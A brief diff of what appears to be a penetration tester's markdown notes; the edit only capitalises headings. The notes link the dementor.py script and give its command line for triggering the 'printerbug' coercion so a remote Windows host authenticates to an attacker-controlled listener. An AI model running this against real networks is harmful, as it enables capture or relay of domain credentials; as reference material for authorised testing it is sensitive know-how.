@@ -1,7 +1,7 @@
-### source
+### Source
 https://raw.githubusercontent.com/NotMedic/NetNTLMtoSilverTicket/master/dementor.py  
 
-### trigger printerbug authentication
+### Trigger printerbug authentication
 ```
 python3 dementor.py -u <user> -p <password> -d <domain> <lhost> <rhost>
 ```
